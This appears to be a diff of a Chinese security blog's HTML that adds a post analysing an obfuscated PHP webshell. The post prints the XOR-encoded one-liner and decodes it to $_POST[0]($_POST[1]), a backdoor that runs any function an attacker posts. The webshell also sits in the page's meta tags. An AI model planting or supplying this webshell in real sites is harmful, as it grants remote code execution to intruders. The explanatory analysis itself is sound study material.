@@ -13,6 +13,8 @@
     
 
     
+        <meta name="description" content="1234567891011&amp;lt;?php@$_++;$__=(&#34;#&#34;^&#34;|&#34;); $__.=(&#34;.&#34;^&#34;~&#34;); $__.=(&#34;/&#34;^&#34;`&#34;); $__.=(&#34;|&#34;^&#34;/&#34;); $__.=(&#34;&amp;#123;&#34;^&#34;/&#34;); $&amp;#123;$__&amp;#125;[!$_]($&amp;#123;$__&amp;#125;[">
+    
 
     <!--Author-->
     
@@ -21,10 +23,12 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="Zovida">
+        <meta property="og:title" content="WebShell的分析">
     
 
     <!--Open Graph Description-->
+    
+        <meta property="og:description" content="1234567891011&amp;lt;?php@$_++;$__=(&#34;#&#34;^&#34;|&#34;); $__.=(&#34;.&#34;^&#34;~&#34;); $__.=(&#34;/&#34;^&#34;`&#34;); $__.=(&#34;|&#34;^&#34;/&#34;); $__.=(&#34;&amp;#123;&#34;^&#34;/&#34;); $&amp;#123;$__&amp;#125;[!$_]($&amp;#123;$__&amp;#125;[">
     
 
     <!--Open Graph Site Name-->
@@ -32,7 +36,7 @@
 
     <!--Type page-->
     
-        <meta property="og:type" content="website">
+        <meta property="og:type" content="article">
     
 
     <!--Page Cover-->
@@ -51,7 +55,7 @@
 
     <!-- Title -->
     
-    <title>Archives - Zovida</title>
+    <title>WebShell的分析 - Zovida</title>
 
     <!-- Bootstrap Core CSS -->
     <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet">
@@ -153,168 +157,64 @@
 </nav>
 
     <!-- Main Content -->
-    
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
 
-<!-- Page Header -->
-<!-- Set your background image for this header in the theme's configuration: index_cover -->
 <header class="intro-header" style="background-image: url('https://b2.bmp.ovh/imgs/2019/07/15d0796a4a8b1ce3.png')">
     <div class="container">
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-                <div class="site-heading">
-                    <h1>Archives</h1>
+                <div class="post-heading">
+                    <h1>WebShell的分析</h1>
+                    
+                    <span class="meta">
+                        <!-- Date and Author -->
+                        
+                        
+                            2019-09-21
+                        
+                    </span>
                 </div>
             </div>
         </div>
     </div>
 </header>
 
-<!-- Main Content -->
-<div class="container">
-    <div class="row">
-        <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Tags and categories -->
+           
+
+            <!-- Gallery -->
             
-                <div class="post-preview">
-    <a href="/2019/09/21/WebShell的分析/">
-        <h1 class="post-title archive">
-            WebShell的分析
-        </h1>
-    </a>
-    <p class="post-meta archive">
-        <!-- Date and Author -->
-        
-        2019-09-21
-    </p>
-</div>
+
+            <!-- Post Main Content -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">@<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$__</span>=(<span class="string">"#"</span>^<span class="string">"|"</span>); </span><br><span class="line"><span class="variable">$__</span>.=(<span class="string">"."</span>^<span class="string">"~"</span>); </span><br><span class="line"><span class="variable">$__</span>.=(<span class="string">"/"</span>^<span class="string">"`"</span>); </span><br><span class="line"><span class="variable">$__</span>.=(<span class="string">"|"</span>^<span class="string">"/"</span>); </span><br><span class="line"><span class="variable">$__</span>.=(<span class="string">"&#123;"</span>^<span class="string">"/"</span>); </span><br><span class="line"><span class="variable">$&#123;$__&#125;</span>[!<span class="variable">$_</span>](<span class="variable">$&#123;$__&#125;</span>[<span class="variable">$_</span>]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在php里，定义的空变量值未false=0，所以$_自增之后的值为1；</p>
+<p>^在php逻辑运算符里代表异或，即将符号转换为二进制之后进行异或运算，之后再转换为符号或字母等。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"#"</span>^<span class="string">"|"</span></span><br><span class="line">00100011’^’ 01111100   ==&gt; 01011111   ==&gt;  ‘_’</span><br><span class="line"></span><br><span class="line"><span class="string">"."</span>^<span class="string">"~"</span></span><br><span class="line">00101110’^’ 01111110   ==&gt; 01010000   ==&gt;  ‘P’</span><br><span class="line"></span><br><span class="line"><span class="string">"/"</span>^<span class="string">"`"</span></span><br><span class="line">00101111’^’ 01100000   ==&gt; 01001111   ==&gt;  ‘O’</span><br><span class="line"></span><br><span class="line"><span class="string">"|"</span>^<span class="string">"/"</span></span><br><span class="line">01111100’^’ 00101111   ==&gt; 01010011   ==&gt;  ‘S’</span><br><span class="line"></span><br><span class="line"><span class="string">"&#123;"</span>^<span class="string">"/"</span></span><br><span class="line">01111011’^’ 00101111   ==&gt; 01010100   ==&gt;  ‘T’</span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;$__&#125;</span>[!<span class="variable">$_</span>](<span class="variable">$&#123;$__&#125;</span>[<span class="variable">$_</span>]);  ==&gt;   <span class="variable">$_POST</span>[0](<span class="variable">$_POST</span>[1]);</span><br></pre></td></tr></table></figure>
+
+
+
+                
+            </div>
+
+            <!-- Comments -->
             
-                <div class="post-preview">
-    <a href="/2019/09/10/Boolean盲注的测试/">
-        <h1 class="post-title archive">
-            Boolean盲注的测试
-        </h1>
-    </a>
-    <p class="post-meta archive">
-        <!-- Date and Author -->
-        
-        2019-09-10
-    </p>
-</div>
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    
+
+
+                </div>
             
-                <div class="post-preview">
-    <a href="/2019/09/08/CVE-2019-0708的复现/">
-        <h1 class="post-title archive">
-            CVE-2019-0708的漏洞复现
-        </h1>
-    </a>
-    <p class="post-meta archive">
-        <!-- Date and Author -->
-        
-        2019-09-08
-    </p>
-</div>
-            
-                <div class="post-preview">
-    <a href="/2019/08/31/sql注入测试/">
-        <h1 class="post-title archive">
-            sql注入测试
-        </h1>
-    </a>
-    <p class="post-meta archive">
-        <!-- Date and Author -->
-        
-        2019-08-31
-    </p>
-</div>
-            
-                <div class="post-preview">
-    <a href="/2019/08/25/利用Burp Suite抓取手机流量包/">
-        <h1 class="post-title archive">
-            利用Burp Suite抓取手机流量包
-        </h1>
-    </a>
-    <p class="post-meta archive">
-        <!-- Date and Author -->
-        
-        2019-08-25
-    </p>
-</div>
-            
-                <div class="post-preview">
-    <a href="/2019/08/22/Burp Suite的使用介绍/">
-        <h1 class="post-title archive">
-            Burp Suite的使用介绍
-        </h1>
-    </a>
-    <p class="post-meta archive">
-        <!-- Date and Author -->
-        
-        2019-08-22
-    </p>
-</div>
-            
-                <div class="post-preview">
-    <a href="/2019/08/20/HTTP基础/">
-        <h1 class="post-title archive">
-            HTTP协议基础
-        </h1>
-    </a>
-    <p class="post-meta archive">
-        <!-- Date and Author -->
-        
-        2019-08-20
-    </p>
-</div>
-            
-                <div class="post-preview">
-    <a href="/2019/08/13/mysql连接查询/">
-        <h1 class="post-title archive">
-            mysql联合查询
-        </h1>
-    </a>
-    <p class="post-meta archive">
-        <!-- Date and Author -->
-        
-        2019-08-13
-    </p>
-</div>
-            
-                <div class="post-preview">
-    <a href="/2019/08/12/mysql命令行查询导入的sql文件/">
-        <h1 class="post-title archive">
-            在cmd命令里查询导入的数据库文件信息
-        </h1>
-    </a>
-    <p class="post-meta archive">
-        <!-- Date and Author -->
-        
-        2019-08-12
-    </p>
-</div>
-            
-                <div class="post-preview">
-    <a href="/2019/08/12/新闻界面的搭建/">
-        <h1 class="post-title archive">
-            新闻界面的搭建
-        </h1>
-    </a>
-    <p class="post-meta archive">
-        <!-- Date and Author -->
-        
-        2019-08-12
-    </p>
-</div>
-            
-            <div class="archive-before-pagination"></div>
-            <ul class="pager">
-    
-    
-        <li class="next"><a href="/archives/page/2/">Older Posts  &rarr;</a></li>
-    
-</ul>
         </div>
     </div>
-</div>
-
+</article>
 
     <!-- Footer -->
     <hr />
